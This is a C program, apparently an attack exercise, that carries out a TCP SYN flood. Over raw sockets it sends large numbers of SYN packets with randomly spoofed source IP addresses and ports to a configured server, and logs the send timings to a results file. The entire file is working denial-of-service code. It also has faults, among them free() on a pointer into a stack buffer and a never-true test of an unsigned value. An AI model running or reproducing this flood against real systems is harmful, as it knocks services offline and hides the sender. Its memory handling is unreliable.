#include <unistd.h>
#include <time.h>
#include <string.h>
#include <errno.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include "Attack.h"

void set_packet(char *packet, struct iphdr *ip, struct tcphdr *tcp, struct sockaddr_in addr, struct pseudo_header psh, int sock, FILE* file)
{
    memset(packet, 0, IP_MAXPACKET);
    char *ipv4 = NULL;
    ipv4 = get_random_ipv4(sock, file);

    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    ip->id = htons(54321);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_TCP;
    ip->check = 0;
    ip->saddr = inet_addr(ipv4);
    ip->daddr = addr.sin_addr.s_addr;
    ip->check = calculate_checksum((unsigned short *)packet, ip->tot_len >> 1);

    tcp->source = htons(get_random_port());
    tcp->dest = htons(SERVER_PORT);
    tcp->seq = 0;
    tcp->ack_seq = 0;
    tcp->doff = 5;
    tcp->fin = 0;
    tcp->syn = 1;
    tcp->rst = 0;
    tcp->psh = 0;
    tcp->ack = 0;
    tcp->urg = 0;
    tcp->window = htons(8192);
    tcp->check = 0;
    tcp->urg_ptr = 0;

    psh.source_address = inet_addr(ipv4);
    psh.destination_address = addr.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);

    memcpy(&psh.tcph, tcp, sizeof(struct tcphdr));

    tcp->check = calculate_checksum((unsigned short *)&psh, sizeof(struct pseudo_header));

    free(ip);
    ip = NULL;
}

char *get_random_ipv4(int sock, FILE *file)
{
    char *ipv4 = NULL;
    ipv4 = (char *)calloc(IP_ADDR_LENGTH, sizeof(char));
    if (ipv4 == NULL)
    {
        perror("calloc() failed");

        close(sock);

        fclose(file);
        file = NULL;

        exit(errno);
    }

    sprintf(ipv4, "%d.%d.%d.%d", (rand() % 256), (rand() % 256), (rand() % 256), (rand() % 256));

    return ipv4;
}

int get_random_port()
{
    return (int)(rand() % (65535 - 1024 + 1) + 1024);
}

unsigned short calculate_checksum(unsigned short *ptr, int nbytes)
{
    register long sum = 0;
    unsigned short oddbyte = 0;
    register short checksum = 0;

    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1)
    {
        oddbyte = 0;
        *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    checksum = (short)~sum;

    return (checksum);
}

int main(int argc, char *argv[])
{
    srand(time(NULL));

    int sock = 0;
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock <= 0)
    {
        perror("socket() failed");
        exit(errno);
    }

    int buffer_size = 1024 * 1024;
    if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(int)) < 0)
    {
        perror("buffer-size: setsockopt() failed");
        close(sock);
        exit(errno);
    }

    int optval = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(int)) < 0)
    {
        perror("IP: setsockopt() failed");
        close(sock);
        exit(errno);
    }

    FILE *file = NULL;
    file = fopen(RESULTS_FILE, "w");
    if (file == NULL)
    {
        perror("fopen() failed");
        close(sock);
        exit(errno);
    }

    char syn_packet[IP_MAXPACKET] = {0};
    memset(syn_packet, 0, IP_MAXPACKET);

    struct iphdr *ip_header = {0};
    memset(&ip_header, 0, sizeof(struct iphdr));
    ip_header = (struct iphdr *)syn_packet;

    struct tcphdr *tcp_header = {0};
    memset(&tcp_header, 0, sizeof(struct tcphdr));
    tcp_header = (struct tcphdr *)(syn_packet + sizeof(struct iphdr));

    struct sockaddr_in target_addr = {0};
    memset(&target_addr, 0, sizeof(struct sockaddr_in));
    target_addr.sin_family = AF_INET;
    target_addr.sin_addr.s_addr = inet_addr(SERVER_IP_ADDRESS);
    target_addr.sin_port = htons(SERVER_PORT);

    struct pseudo_header psh = {0};
    memset(&psh, 0, sizeof(struct pseudo_header));

    size_t sent = 0;
    int i = 0, j = 0;

    double avg = 0.0;
    struct timeval before_send = {0}, after_send = {0};

    for (i = 0; i < NUM_ITERATIONS; i++)
    {
        for (j = 0; j < NUM_PACKETS; j++)
        {
            memset(&before_send, 0, sizeof(struct timeval));
            memset(&after_send, 0, sizeof(struct timeval));

            set_packet(syn_packet, ip_header, tcp_header, target_addr, psh, sock, file);

            gettimeofday(&before_send, NULL);
            sent = sendto(sock, syn_packet, IP_MAXPACKET, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
            gettimeofday(&after_send, NULL);

            while (sent < 0)
            {
                memset(&before_send, 0, sizeof(struct timeval));
                memset(&after_send, 0, sizeof(struct timeval));

                gettimeofday(&before_send, NULL);
                sent = sendto(sock, syn_packet, IP_MAXPACKET, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
                gettimeofday(&after_send, NULL);
            }

            avg += (after_send.tv_sec - before_send.tv_sec) + (after_send.tv_usec - before_send.tv_usec) / 1000000.0;

            fprintf(file, "%d %f\n", (i * NUM_PACKETS + j), ((after_send.tv_sec - before_send.tv_sec) + (after_send.tv_usec - before_send.tv_usec) / 1000000.0));
        }

        fprintf(stdout, "Sent %d packets.", (i + 1) * NUM_PACKETS);
    }

    avg /= NUM_ITERATIONS * NUM_PACKETS;

    fprintf(file, "%f", avg);

    close(sock);

    fclose(file);
    file = NULL;

    return 0;
}
